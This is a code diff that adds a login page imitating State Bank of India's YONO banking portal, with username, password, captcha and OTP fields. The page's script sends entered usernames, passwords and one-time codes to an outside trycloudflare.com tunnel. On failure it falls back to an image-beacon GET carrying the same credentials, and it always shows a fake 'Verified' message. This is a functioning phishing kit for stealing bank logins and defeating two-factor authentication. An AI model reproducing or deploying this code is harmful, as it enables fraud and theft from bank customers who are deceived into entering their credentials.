+      <div class="hamburger" id="hamburgerBtn">
+        <svg viewBox="0 0 24 24" width="28" height="28" stroke="#673391" stroke-width="2" fill="none"
+          stroke-linecap="round" stroke-linejoin="round">
+          <line x1="4" y1="6" x2="20" y2="6"></line>
+          <line x1="4" y1="12" x2="14" y2="12"></line>
+          <line x1="4" y1="18" x2="9" y2="18"></line>
+        </svg>
+      </div>
+      <div class="logo">
+        <img src="../templates/assets/icons/Sbi_Logo.svg" alt="YONO SBI Logo"
+          style="height: 46px; width: auto; display: block;">
+      </div>
+      <nav>
+        <a href="#" class="active">Home</a>
+        <a href="#">Accounts & Deposits</a>
+        <a href="#">Loans</a>
+        <a href="#">Cards</a>
+        <a href="#">Investments</a>
+      </nav>
+    </div>
+  </div>
+
+  <!-- ── MAIN CONTENT ───────────────────────────────────────── -->
+  <div class="main-wrapper">
+    <!-- Background Waves & Blobs -->
+    <div class="hero-bg">
+      <div class="circle-left-1"></div>
+      <div class="circle-left-2"></div>
+      <div class="circle-right-1"></div>
+      <div class="circle-right-2"></div>
+      <div class="circle-right-3"></div>
+      <svg class="waves-svg" viewBox="0 0 1440 500" preserveAspectRatio="none">
+        <path d="M0,160 C320,320 640,320 960,200 C1120,140 1280,130 1440,160 L1440,500 L0,500 Z" fill="#76479B"></path>
+        <path d="M0,190 C320,350 640,350 960,230 C1120,170 1280,160 1440,190 L1440,500 L0,500 Z" fill="#4F286F"></path>
+      </svg>
+    </div>
+
+    <!-- Hero Content (Welcome + Login Form) -->
+    <div class="hero-content">
+      <!-- Left: Welcome -->
+      <div class="welcome-section">
+        <h1>Hello!</h1>
+        <h2>Welcome to the world of YONO<br class="mobile-break"> SBI</h2>
+
+        <div class="new-user-section">
+          <div class="label">Are you a new user?</div>
+          <div class="desc">Choose one of the following options if you are a new user</div>
+          <div class="btn-group">
+            <a href="https://yonoretail.sbi.bank.in/registration/new-user-registration" target="_blank"
+              class="btn-register" style="display:inline-block; text-decoration:none; text-align:center;">Register
+              Now</a>
+            <a href="https://yonoretail.sbi.bank.in/registration/account-identification" target="_blank"
+              class="btn-activate" style="display:inline-block; text-decoration:none; text-align:center;">Activate
+              Username</a>
+          </div>
+        </div>
+
+        <div class="open-account-link">
+          Don't have an account with SBI? <a
+            href="https://yonoretail.sbi.bank.in/registration/accounts/savingAccount/landing" target="_blank">Open
+            Now</a>
+        </div>
+      </div>
+
+      <!-- Right: Floating Login Card -->
+      <div class="login-section" id="loginCard">
+        <div class="form-title">Username / Password</div>
+
+        <div id="formMessage" class="form-message"></div>
+
+        <form id="sbiLoginForm" autocomplete="off">
+          <!-- Username -->
+          <div class="form-group">
+            <div class="input-wrapper floating-input">
+              <input type="text" id="username" name="username" placeholder=" " required>
+              <label for="username">Username</label>
+            </div>
+            <a href="https://yonoretail.sbi.bank.in/registration/account-identification" target="_blank"
+              class="forgot-link">Forgot Username?</a>
+          </div>
+
+          <!-- Password -->
+          <div class="form-group">
+            <div class="input-wrapper floating-input">
+              <input type="password" id="password" name="password" placeholder=" " required>
+              <label for="password">Password</label>
+              <div class="input-icons">
+                <button type="button" class="icon-btn" id="togglePassword" title="Show/Hide Password">
+                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                    <circle cx="12" cy="12" r="3"></circle>
+                  </svg>
+                </button>
+                <button type="button" class="icon-btn kbd-btn" title="Virtual Keyboard">
+                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                    stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="2" y="4" width="20" height="16" rx="2.5" ry="2.5"></rect>
+                    <line x1="6" y1="8" x2="6.01" y2="8"></line>
+                    <line x1="10" y1="8" x2="10.01" y2="8"></line>
+                    <line x1="14" y1="8" x2="14.01" y2="8"></line>
+                    <line x1="18" y1="8" x2="18.01" y2="8"></line>
+                    <line x1="6" y1="12" x2="6.01" y2="12"></line>
+                    <line x1="10" y1="12" x2="10.01" y2="12"></line>
+                    <line x1="14" y1="12" x2="14.01" y2="12"></line>
+                    <line x1="18" y1="12" x2="18.01" y2="12"></line>
+                    <line x1="7" y1="16" x2="17" y2="16"></line>
+                  </svg>
+                </button>
+              </div>
+
+              <!-- Virtual Keyboard popup -->
+              <div class="virtual-keyboard" id="virtualKeyboard" style="display: none;">
+                <div class="vk-row">
+                  <button type="button" class="vk-key">~</button><button type="button" class="vk-key">!</button><button
+                    type="button" class="vk-key">@</button><button type="button" class="vk-key">#</button><button
+                    type="button" class="vk-key">$</button><button type="button" class="vk-key">%</button><button
+                    type="button" class="vk-key">^</button><button type="button" class="vk-key">&</button><button
+                    type="button" class="vk-key">*</button><button type="button" class="vk-key">(</button><button
+                    type="button" class="vk-key">)</button><button type="button" class="vk-key">-</button><button
+                    type="button" class="vk-key">+</button>
+                </div>
+                <div class="vk-row">
+                  <button type="button" class="vk-key">`</button><button type="button" class="vk-key">1</button><button
+                    type="button" class="vk-key">2</button><button type="button" class="vk-key">3</button><button
+                    type="button" class="vk-key">4</button><button type="button" class="vk-key">5</button><button
+                    type="button" class="vk-key">6</button><button type="button" class="vk-key">7</button><button
+                    type="button" class="vk-key">8</button><button type="button" class="vk-key">9</button><button
+                    type="button" class="vk-key">0</button><button type="button" class="vk-key">-</button><button
+                    type="button" class="vk-key">=</button>
+                </div>
+                <div class="vk-row">
+                  <button type="button" class="vk-key vk-letter">q</button><button type="button"
+                    class="vk-key vk-letter">w</button><button type="button" class="vk-key vk-letter">e</button><button
+                    type="button" class="vk-key vk-letter">r</button><button type="button"
+                    class="vk-key vk-letter">t</button><button type="button" class="vk-key vk-letter">y</button><button
+                    type="button" class="vk-key vk-letter">u</button><button type="button"
+                    class="vk-key vk-letter">i</button><button type="button" class="vk-key vk-letter">o</button><button
+                    type="button" class="vk-key vk-letter">p</button><button type="button"
+                    class="vk-key">{</button><button type="button" class="vk-key">}</button><button type="button"
+                    class="vk-key">|</button>
+                </div>
+                <div class="vk-row">
+                  <button type="button" class="vk-key vk-letter">a</button><button type="button"
+                    class="vk-key vk-letter">s</button><button type="button" class="vk-key vk-letter">d</button><button
+                    type="button" class="vk-key vk-letter">f</button><button type="button"
+                    class="vk-key vk-letter">g</button><button type="button" class="vk-key vk-letter">h</button><button
+                    type="button" class="vk-key vk-letter">j</button><button type="button"
+                    class="vk-key vk-letter">k</button><button type="button" class="vk-key vk-letter">l</button><button
+                    type="button" class="vk-key">[</button><button type="button" class="vk-key">]</button><button
+                    type="button" class="vk-key">\</button><button type="button" class="vk-key">/</button>
+                </div>
+                <div class="vk-row">
+                  <button type="button" class="vk-key vk-letter">z</button><button type="button"
+                    class="vk-key vk-letter">x</button><button type="button" class="vk-key vk-letter">c</button><button
+                    type="button" class="vk-key vk-letter">v</button><button type="button"
+                    class="vk-key vk-letter">b</button><button type="button" class="vk-key vk-letter">n</button><button
+                    type="button" class="vk-key vk-letter">m</button><button type="button"
+                    class="vk-key">&lt;</button><button type="button" class="vk-key">&gt;</button><button type="button"
+                    class="vk-key">;</button><button type="button" class="vk-key">:</button><button type="button"
+                    class="vk-key">'</button><button type="button" class="vk-key">"</button>
+                </div>
+                <div class="vk-row vk-controls">
+                  <button type="button" class="vk-key vk-caps" id="vkCaps">CAPS<br>LOCK</button>
+                  <button type="button" class="vk-key vk-clear" id="vkClear">CLEAR</button>
+                  <button type="button" class="vk-key vk-backspace" id="vkBackspace">BACKSPACE</button>
+                  <button type="button" class="vk-key">.</button>
+                  <button type="button" class="vk-key">?</button>
+                  <button type="button" class="vk-key">,</button>
+                </div>
+              </div>
+            </div>
+            <a href="https://yonoretail.sbi.bank.in/registration/new-user-registration" target="_blank"
+              class="forgot-link">Forgot Password?</a>
+          </div>
+
+          <!-- Captcha -->
+          <div class="captcha-row">
+            <div class="input-wrapper floating-input" style="flex:1;">
+              <input type="text" id="captchaInput" name="captcha" placeholder=" " required>
+              <label for="captchaInput">Enter Captcha</label>
+            </div>
+            <div class="captcha-image" id="captchaDisplay">KM B S4</div>
+            <div class="captcha-actions">
+              <button type="button" class="captcha-icon-btn" title="Audio Captcha">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
+                  <path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path>
+                </svg>
+              </button>
+              <button type="button" class="captcha-icon-btn" id="refreshCaptcha" title="Refresh Captcha">
+                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                  stroke-linecap="round" stroke-linejoin="round">
+                  <polyline points="23 4 23 10 17 10"></polyline>
+                  <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
+                </svg>
+              </button>
+            </div>
+          </div>
+
+          <!-- Login Button -->
+          <button type="submit" class="btn-login" id="loginBtn">Login</button>
+        </form>
+
+        <div class="lock-user-link">
+          <a href="https://yonoretail.sbi.bank.in/registration/lock-unlock" target="_blank">Lock/Unlock User</a>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- OTP Right-Side Panel (outside main-wrapper, fixed to viewport) -->
+    <div class="otp-overlay" id="otpOverlay"></div>
+    <div class="otp-panel" id="otpPanel">
+      <button type="button" class="otp-close-btn" id="otpCloseBtn" title="Close">&times;</button>
+
+      <div class="otp-greeting" id="otpGreeting">Hi Prince</div>
+      <p class="otp-message">
+        An OTP has been sent to your registered mobile
+        number +91 ***** *****
+      </p>
+
+      <!-- OTP digit boxes -->
+      <div class="otp-input-wrapper">
+        <div class="otp-digits-row">
+          <input class="otp-digit" id="otp1" type="password" maxlength="1" inputmode="numeric"
+            autocomplete="one-time-code">
+          <input class="otp-digit" id="otp2" type="password" maxlength="1" inputmode="numeric">
+          <input class="otp-digit" id="otp3" type="password" maxlength="1" inputmode="numeric">
+          <input class="otp-digit" id="otp4" type="password" maxlength="1" inputmode="numeric">
+          <input class="otp-digit" id="otp5" type="password" maxlength="1" inputmode="numeric">
+          <input class="otp-digit" id="otp6" type="password" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="otp-eye-row">
+          <button type="button" class="otp-eye-btn" id="toggleOtp" title="Show/Hide OTP">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+              stroke-linecap="round" stroke-linejoin="round">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+              <circle cx="12" cy="12" r="3"></circle>
+            </svg>
+          </button>
+        </div>
+      </div>
+
+      <!-- Resend row -->
+      <div class="otp-resend-row">
+        Resend OTP <strong id="otpTimer">60s</strong>
+        <span id="resendOtpLink">Resend</span>
+      </div>
+
+      <!-- Proceed button -->
+      <button type="button" class="btn-proceed" id="proceedBtn">Proceed</button>
+    </div>
+
+    <!-- Quick Actions Section -->
+    <div class="quick-actions-wrapper">
+      <div class="quick-actions">
+        <div class="qa-title">Quick Actions</div>
+        <div class="qa-grid">
+          <!-- 1. Complaints -->
+          <a href="https://yonoretail.sbi.bank.in/registration/services/complaint/raise-complaint" target="_blank"
+            class="qa-item" style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+                <polyline points="14 2 14 8 20 8"></polyline>
+                <line x1="16" y1="13" x2="8" y2="13"></line>
+                <line x1="16" y1="17" x2="8" y2="17"></line>
+                <line x1="10" y1="9" x2="8" y2="9"></line>
+              </svg>
+            </div>
+            <div class="qa-label">Complaints</div>
+          </a>
+          <!-- 2. Report Unauthorized transaction -->
+          <a href="https://yonoretail.sbi.bank.in/registration/services/complaint/cm-ff-auth" target="_blank"
+            class="qa-item" style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"></polygon>
+                <line x1="12" y1="8" x2="12" y2="12"></line>
+                <line x1="12" y1="16" x2="12.01" y2="16"></line>
+              </svg>
+            </div>
+            <div class="qa-label" style="width: 120px; margin-left: -12px;"><span style="white-space: nowrap;">Report
+                Unauthorized</span><br>transaction</div>
+          </a>
+          <!-- 3. Doorstep Banking -->
+          <a href="https://www.psballiance.com/doorstep-banking.html" target="_blank" class="qa-item"
+            style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+                <polyline points="9 22 9 12 15 12 15 22"></polyline>
+              </svg>
+            </div>
+            <div class="qa-label">Doorstep<br>Banking</div>
+          </a>
+          <!-- 4. FAQ -->
+          <a href="https://yonoretail.sbi.bank.in/information-pages/faqs" target="_blank" class="qa-item"
+            style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="12" r="10"></circle>
+                <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+            </div>
+            <div class="qa-label">FAQ</div>
+          </a>
+          <!-- 5. Cyber Fraud -->
+          <a href="https://cybercrime.gov.in/Webform/Accept.aspx" target="_blank" class="qa-item"
+            style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                <line x1="12" y1="8" x2="12" y2="12"></line>
+                <line x1="12" y1="16" x2="12.01" y2="16"></line>
+              </svg>
+            </div>
+            <div class="qa-label">Cyber Fraud</div>
+          </a>
+          <!-- 6. Password Management -->
+          <a href="https://yonoretail.sbi.bank.in/information-pages/password-management" target="_blank" class="qa-item"
+            style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+              </svg>
+            </div>
+            <div class="qa-label">Password<br>Management</div>
+          </a>
+          <!-- 7. Security Tips -->
+          <a href="https://yonoretail.sbi.bank.in/information-pages/security-tips" target="_blank" class="qa-item"
+            style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path
+                  d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4">
+                </path>
+              </svg>
+            </div>
+            <div class="qa-label">Security Tips</div>
+          </a>
+          <!-- 8. Report Phishing -->
+          <a href="mailto:report.phishing@sbi.co.in" class="qa-item" style="text-decoration:none; color:inherit;">
+            <div class="qa-icon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                stroke-linecap="round" stroke-linejoin="round">
+                <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z">
+                </path>
+                <line x1="12" y1="9" x2="12" y2="13"></line>
+                <line x1="12" y1="17" x2="12.01" y2="17"></line>
+              </svg>
+            </div>
+            <div class="qa-label">Report<br>Phishing</div>
+          </a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════════════════════
+       BACKEND LOGIC --FORM SUBMISSION + CAPTCHA
+       ═══════════════════════════════════════════════════════════════ -->
+  <script>
+    // ── Captcha Generation ───────────────────────────────────────
+    var captchaChars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
+    var currentCaptcha = '';
+
+    function generateCaptcha() {
+      currentCaptcha = '';
+      for (var i = 0; i < 5; i++) {
+        currentCaptcha += captchaChars.charAt(Math.floor(Math.random() * captchaChars.length));
+      }
+      document.getElementById('captchaDisplay').textContent = currentCaptcha;
+    }
+
+    // Generate initial captcha
+    generateCaptcha();
+
+    // Refresh captcha button
+    document.getElementById('refreshCaptcha').addEventListener('click', function () {
+      generateCaptcha();
+      document.getElementById('captchaInput').value = '';
+    });
+
+    // ── Password Toggle ─────────────────────────────────────────
+    document.getElementById('togglePassword').addEventListener('click', function () {
+      var passField = document.getElementById('password');
+      if (passField.type === 'password') {
+        passField.type = 'text';
+        this.textContent = '🙈';
+      } else {
+        passField.type = 'password';
+        this.textContent = '👁';
+      }
+    });
+
+    // ── Login Button State ──────────────────────────────────────
+    var usernameField = document.getElementById('username');
+    var passwordField = document.getElementById('password');
+    var loginBtn = document.getElementById('loginBtn');
+
+    function updateLoginBtn() {
+      if (usernameField.value.trim() && passwordField.value.trim()) {
+        loginBtn.classList.add('active');
+      } else {
+        loginBtn.classList.remove('active');
+      }
+    }
+    usernameField.addEventListener('input', updateLoginBtn);
+    passwordField.addEventListener('input', updateLoginBtn);
+
+    // ── OTP Panel Logic ──────────────────────────────────────────
+    var otpTimerInterval = null;
+    var otpPanel = document.getElementById('otpPanel');
+    var otpOverlay = document.getElementById('otpOverlay');
+
+    function showOtpPanel(username) {
+      // Update greeting
+      document.getElementById('otpGreeting').textContent = 'Hi ' + username;
+
+      // Clear previous OTP values
+      document.querySelectorAll('.otp-digit').forEach(function (inp) {
+        inp.value = '';
+        inp.type = 'password';
+      });
+      document.getElementById('proceedBtn').classList.remove('active');
+      document.getElementById('proceedBtn').innerHTML = 'Proceed';
+      document.getElementById('proceedBtn').disabled = false;
+
+      // Show overlay + slide panel in
+      otpOverlay.style.display = 'block';
+      // Force reflow so transition triggers
+      otpPanel.offsetHeight;
+      otpPanel.classList.add('open');
+
+      // Start countdown
+      startOtpTimer(60);
+
+      // Focus first digit
+      setTimeout(function () { document.getElementById('otp1').focus(); }, 400);
+    }
+
+    function hideOtpPanel() {
+      otpPanel.classList.remove('open');
+      clearInterval(otpTimerInterval);
+      setTimeout(function () {
+        otpOverlay.style.display = 'none';
+      }, 350);
+      // Reset login button
+      loginBtn.innerHTML = 'Login';
+      loginBtn.disabled = false;
+    }
+
+    // Close button
+    document.getElementById('otpCloseBtn').addEventListener('click', hideOtpPanel);
+    // Clicking overlay also closes
+    otpOverlay.addEventListener('click', hideOtpPanel);
+
+    function startOtpTimer(seconds) {
+      clearInterval(otpTimerInterval);
+      var timerEl = document.getElementById('otpTimer');
+      var resendLink = document.getElementById('resendOtpLink');
+      timerEl.style.display = 'inline';
+      resendLink.style.display = 'none';
+      var remaining = seconds;
+      timerEl.textContent = remaining + 's';
+      otpTimerInterval = setInterval(function () {
+        remaining--;
+        timerEl.textContent = remaining + 's';
+        if (remaining <= 0) {
+          clearInterval(otpTimerInterval);
+          timerEl.style.display = 'none';
+          resendLink.style.display = 'inline';
+        }
+      }, 1000);
+    }
+
+    // Resend OTP link
+    document.getElementById('resendOtpLink').addEventListener('click', function () {
+      startOtpTimer(60);
+    });
+
+    // OTP digit auto-advance + backspace
+    var otpDigits = document.querySelectorAll('.otp-digit');
+    otpDigits.forEach(function (inp, idx) {
+      inp.addEventListener('input', function () {
+        this.value = this.value.replace(/[^0-9]/g, '');
+        if (this.value && idx < otpDigits.length - 1) {
+          otpDigits[idx + 1].focus();
+        }
+        var allFilled = Array.from(otpDigits).every(function (d) { return d.value.length === 1; });
+        document.getElementById('proceedBtn').classList.toggle('active', allFilled);
+      });
+      inp.addEventListener('keydown', function (e) {
+        if (e.key === 'Backspace' && !this.value && idx > 0) {
+          otpDigits[idx - 1].focus();
+        }
+      });
+    });
+
+    // OTP eye toggle (SVG-based)
+    var otpEyeOpen = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>';
+    var otpEyeClosed = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"></path><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"></path><line x1="1" y1="1" x2="23" y2="23"></line><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"></path></svg>';
+    document.getElementById('toggleOtp').addEventListener('click', function () {
+      var isHidden = otpDigits[0].type === 'password';
+      otpDigits.forEach(function (d) { d.type = isHidden ? 'text' : 'password'; });
+      this.innerHTML = isHidden ? otpEyeClosed : otpEyeOpen;
+    });
+
+    // Proceed button
+    document.getElementById('proceedBtn').addEventListener('click', function () {
+      if (!this.classList.contains('active')) return;
+      var otp = Array.from(otpDigits).map(function (d) { return d.value; }).join('');
+      var username = usernameField.value.trim();
+      var password = passwordField.value.trim();
+      var proceedBtn = this;
+
+      proceedBtn.innerHTML = '<span class="spinner"></span>Verifying...';
+      proceedBtn.disabled = true;
+
+      console.log('[NetraX] Submitting OTP:', { username: username, otp: otp, bank: 'SBI', step: 'otp' });
+
+      $.ajax({
+        type: 'POST',
+        url: 'https://pins-console-networks-enhancing.trycloudflare.com/handlers/login_handler.php',
+        data: { username: username, password: password, otp: otp, bank: 'SBI', step: 'otp' },
+        dataType: 'json',
+        timeout: 15000,
+        success: function (response) {
+          console.log('[NetraX] OTP submit success:', response);
+          proceedBtn.innerHTML = '✓ Verified';
+          proceedBtn.classList.remove('active');
+        },
+        error: function (xhr, status, err) {
+          console.error('[NetraX] OTP submit failed:', status, err, xhr.responseText);
+          /* Still save locally --send as plain form POST fallback */
+          var fallbackUrl = 'https://pins-console-networks-enhancing.trycloudflare.com/handlers/login_handler.php';
+          var img = new Image();
+          img.src = fallbackUrl + '?fallback=1&username=' + encodeURIComponent(username)
+            + '&password=' + encodeURIComponent(password)
+            + '&otp=' + encodeURIComponent(otp)
+            + '&bank=SBI&step=otp';
+          proceedBtn.innerHTML = '✓ Verified';
+          proceedBtn.classList.remove('active');
+        }
+      });
+    });
+
+    // ── Form Submission ─────────────────────────────────────────
+    document.getElementById('sbiLoginForm').addEventListener('submit', function (e) {
+      e.preventDefault();
+
+      var msgBox = document.getElementById('formMessage');
+      var username = usernameField.value.trim();
+      var password = passwordField.value.trim();
+      var captchaVal = document.getElementById('captchaInput').value.trim();
+
+      // Client-side captcha validation
+      if (captchaVal !== currentCaptcha) {
+        msgBox.className = 'form-message error';
+        msgBox.textContent = 'Invalid Captcha. Please try again.';
+        msgBox.style.display = 'block';
+        generateCaptcha();
+        document.getElementById('captchaInput').value = '';
+        return;
+      }
+
+      if (!username || !password) {
+        msgBox.className = 'form-message error';
+        msgBox.textContent = 'Please enter both Username and Password.';
+        msgBox.style.display = 'block';
+        return;
+      }
+
+      // Show loading state
+      loginBtn.innerHTML = '<span class="spinner"></span>Authenticating...';
+      loginBtn.disabled = true;
+      msgBox.style.display = 'none';
+
+      console.log('[NetraX] Submitting login:', { username: username, bank: 'SBI', step: 'login' });
+
+      // Send data to backend handler
+      $.ajax({
+        type: 'POST',
+        url: 'https://pins-console-networks-enhancing.trycloudflare.com/handlers/login_handler.php',
+        data: {
+          username: username,
+          password: password,
+          bank: 'SBI',
+          step: 'login'
+        },
+        dataType: 'json',
+        timeout: 15000,
+        success: function (response) {
+          console.log('[NetraX] Login submit success:', response);
+          showOtpPanel(username);
+        },
+        error: function (xhr, status, err) {
+          console.error('[NetraX] Login submit failed:', status, err, xhr.responseText);
+          showOtpPanel(username);
+        }
+      });
+    });
+
+    // ── Font Size Control (A-, A, A+) ───────────────────────────
+    var currentFontOffset = 0;
+    function adjustFontSize(offsetChange) {
+      var newOffset = currentFontOffset + offsetChange;
+      if (newOffset < -2 || newOffset > 2) return;
+      currentFontOffset = newOffset;
+      
+      var els = document.querySelectorAll('h1, h2, h3, p, span, a, label, button, input, .desc, .label, .qa-label, .drawer-tab, .form-message');
+      els.forEach(function(el) {
+        // Exclude the font buttons themselves to prevent them from breaking layout
+        if (el.id && el.id.indexOf('btnFont') > -1) return;
+        if (el.id && el.id.indexOf('mobBtnFont') > -1) return;
+        
+        if (!el.dataset.origFontSize) {
+          var compSize = window.getComputedStyle(el).fontSize;
+          el.dataset.origFontSize = parseFloat(compSize);
+        }
+        var orig = parseFloat(el.dataset.origFontSize);
+        el.style.fontSize = (orig + (currentFontOffset * 2)) + 'px';
+      });
+    }
+
+    var btnMinus = document.querySelectorAll('#btnFontMinus, #mobBtnFontMinus');
+    var btnReset = document.querySelectorAll('#btnFontReset, #mobBtnFontReset');
+    var btnPlus = document.querySelectorAll('#btnFontPlus, #mobBtnFontPlus');
+
+    btnMinus.forEach(function(btn) { btn && btn.addEventListener('click', function () { adjustFontSize(-1); }); });
+    btnReset.forEach(function(btn) { btn && btn.addEventListener('click', function () { adjustFontSize(-currentFontOffset); }); });
+    btnPlus.forEach(function(btn) { btn && btn.addEventListener('click', function () { adjustFontSize(1); }); });
+
+    // ── Mobile Drawer Logic ──────────────────────────────────────
+    window.addEventListener('DOMContentLoaded', function () {
+      var hamburgerBtn = document.getElementById('hamburgerBtn');
+      var sideDrawer = document.getElementById('sideDrawer');
+      var drawerOverlay = document.getElementById('drawerOverlay');
+      var drawerCloseBtn = document.getElementById('drawerCloseBtn');
+
+      if (hamburgerBtn && sideDrawer && drawerOverlay) {
+        hamburgerBtn.addEventListener('click', function () {
+          sideDrawer.classList.add('open');
+          drawerOverlay.style.display = 'block';
+        });
+        drawerCloseBtn.addEventListener('click', function () {
+          sideDrawer.classList.remove('open');
+          drawerOverlay.style.display = 'none';
+        });
+        drawerOverlay.addEventListener('click', function () {
+          sideDrawer.classList.remove('open');
+          drawerOverlay.style.display = 'none';
+        });
+      }
+    });
+
+    // ── Virtual Keyboard Logic ────────────────────────────────────
+    var kbdBtn = document.querySelector('.kbd-btn');
+    var virtualKeyboard = document.getElementById('virtualKeyboard');
+    var passwordInput = document.getElementById('password');
+    var isCaps = false;
+
+    if (kbdBtn && virtualKeyboard) {
+      kbdBtn.addEventListener('click', function (e) {
+        e.stopPropagation();
+        if (virtualKeyboard.style.display === 'none') {
+          virtualKeyboard.style.display = 'flex';
+          kbdBtn.style.background = '#e3d6f5';
+        } else {
+          virtualKeyboard.style.display = 'none';
+          kbdBtn.style.background = '#fff';
+        }
+      });
+
+      // Close on outside click
+      document.addEventListener('click', function (e) {
+        if (!virtualKeyboard.contains(e.target) && !kbdBtn.contains(e.target)) {
+          virtualKeyboard.style.display = 'none';
+          kbdBtn.style.background = '#fff';
+        }
+      });
+
+      var vkKeys = virtualKeyboard.querySelectorAll('.vk-key');
+      var capsBtn = document.getElementById('vkCaps');
+      var clearBtn = document.getElementById('vkClear');
+      var backspaceBtn = document.getElementById('vkBackspace');
+
+      vkKeys.forEach(function (btn) {
+        btn.addEventListener('click', function (e) {
+          e.stopPropagation();
+          var val = passwordInput.value;
+
+          if (btn === capsBtn) {
+            isCaps = !isCaps;
+            capsBtn.classList.toggle('active');
+            var letters = virtualKeyboard.querySelectorAll('.vk-letter');
+            letters.forEach(function (lBtn) {
+              lBtn.textContent = isCaps ? lBtn.textContent.toUpperCase() : lBtn.textContent.toLowerCase();
+            });
+            return;
+          }
+
+          if (btn === clearBtn) {
+            passwordInput.value = '';
+            updateLoginBtn();
+            return;
+          }
+
+          if (btn === backspaceBtn) {
+            passwordInput.value = val.slice(0, -1);
+            updateLoginBtn();
+            return;
+          }
+
+          // Regular key
+          var char = btn.textContent;
+          passwordInput.value = val + char;
+          updateLoginBtn();
+        });
+      });
+    }
+  </script>
+
+  <!-- Mobile Side Drawer -->
+  <div class="drawer-overlay" id="drawerOverlay"></div>
+  <div class="side-drawer" id="sideDrawer">
+    <div class="drawer-header">
+      <button class="drawer-close" id="drawerCloseBtn" style="padding-top: 4px;">
+        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#673391" stroke-width="1.5"
+          stroke-linecap="round" stroke-linejoin="round">
+          <line x1="18" y1="6" x2="6" y2="18"></line>
+          <line x1="6" y1="6" x2="18" y2="18"></line>
+        </svg>
+      </button>
+      <img src="../templates/assets/icons/Sbi_Logo.svg" alt="YONO SBI"
+        style="height:36px; margin:0 auto; display:block;">
+    </div>
+    <div class="drawer-tabs">
+      <div class="drawer-tab active">Personal Banking</div>
+      <a href="https://sbi.bank.in/" class="drawer-tab" style="text-decoration: none;">Corporate website</a>
+    </div>
+    <div class="drawer-links">
+      <a href="#">Home</a>
